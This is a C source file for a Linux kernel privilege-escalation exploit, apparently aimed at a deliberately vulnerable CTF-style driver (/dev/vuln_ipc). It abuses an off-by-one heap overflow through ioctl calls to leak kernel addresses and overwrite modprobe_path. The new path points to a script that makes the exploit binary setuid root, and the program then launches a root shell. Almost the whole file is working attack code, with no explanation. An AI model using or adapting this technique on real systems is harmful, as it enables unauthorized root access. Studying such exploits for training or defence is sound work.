#include<stdio.h>
#include<string.h>
#include<stdlib.h>
#include<unistd.h>
#include<sys/mman.h>
#include<sys/wait.h>
#include<sys/types.h>
#include<string.h>
#include<sys/stat.h>
#include<sys/ioctl.h>
#include<fcntl.h>
#include<errno.h>
#include<sys/socket.h>

#define DEVICE_FILE "/dev/vuln_ipc"
#define NEW   0xdead0001
#define DEL   0xdead0002
#define READ  0xdead0003
#define WRITE 0xdead0004

#define CALL_USERMODEHELPER_EXEC_WORK 0x42ef0ul
#define MODPROBE_PATH 0xa3f7e0ul

unsigned long kernel_heap;
unsigned long kernel_base;
unsigned long kernel_modprobe_path;

struct vuln_ipc_new_arg {
  unsigned long id;
  size_t size;
};

struct vuln_ipc_del_arg {
  unsigned long id;
};

struct vuln_ipc_read_arg {
  unsigned long id;
  size_t size;
  char *buffer;
};

struct vuln_ipc_write_arg {
  unsigned long id;
  size_t size;
  const char *buffer;
};
int fd;

void new(unsigned long id,size_t size){
	struct vuln_ipc_new_arg arg_struct={.id=id,.size=size};
	ioctl(fd,NEW,(void *)&arg_struct);
}
void del(unsigned long id){
	struct vuln_ipc_del_arg arg_struct={.id=id};
	ioctl(fd,DEL,(void *)&arg_struct);
}
void Read(unsigned long id,size_t size,char *buffer){
	struct vuln_ipc_read_arg arg_struct={.id=id,.size=size,.buffer=buffer};
	ioctl(fd,READ,(void *)&arg_struct);
}
void Write(unsigned long id,size_t size,char *buffer){
	struct vuln_ipc_write_arg arg_struct={.id=id,.size=size,.buffer=buffer};
	ioctl(fd,WRITE,(void *)&arg_struct);
}
void modprobe_trigger(){
        system("echo -ne '#!/bin/sh\n/bin/chown root:root /mnt/share/exploit\n/bin/chmod u+s /mnt/share/exploit\nchmod g+s /mnt/share/exploit'>/mnt/share/p");
        system("chmod +x /mnt/share/p");
        system("echo -ne '\\xff\\xff\\xff' > /mnt/share/trig");
        system("chmod +x /mnt/share/trig");
        system("/mnt/share/trig 2>/dev/null");
        system("/mnt/share/exploit");
	getchar();
}


void exploit(){
	for(int i=0;i<598;i++){
	new(i,0x80);
	}
	new(700,0x80);
	new(598,0x80);
	char writebuf[0x81]={0};
	Write(598,0x81,writebuf);
	new(599,0x80);
	socket(22,AF_INET,0);
	char readbuf1[0x80]={0};
	char readbuf2[0x80]={0};
	Read(598,0x80,readbuf1);
	Read(599,0x80,readbuf2);
	kernel_heap=*(unsigned long *)(readbuf2+8);
	kernel_base=*(unsigned long *)(readbuf2+0x18)-CALL_USERMODEHELPER_EXEC_WORK;
	printf("[+] kernel_heap=%p\n",kernel_heap);
	printf("[+] kernel_base=%p\n",kernel_base);
	kernel_modprobe_path=kernel_base+MODPROBE_PATH;
	new(600,0x80);
	new(601,0x80);
	Write(601,0x81,writebuf);
	new(602,0x80);
	unsigned long payload[0x80/8];
	for(int i=0;i<0x80/8;i++){
		payload[i]=kernel_modprobe_path-0x10;
	}
	Write(602,0x80,(char *)payload);
	new(603,0x80);
	new(604,0x80);
	char new_path[]="AAAAAAAAAAAAAAAA/mnt/share/p\x00";
	Write(604,sizeof(new_path),new_path);
	modprobe_trigger();
}
int main(){
	setuid(0);
	if(!getuid()){
		puts("[+] Here's your r00t shell!");
		system("/bin/sh");
		return 0;
	}
	fd=open(DEVICE_FILE,O_RDWR);
	exploit();
	close(fd);
	return 0;
}
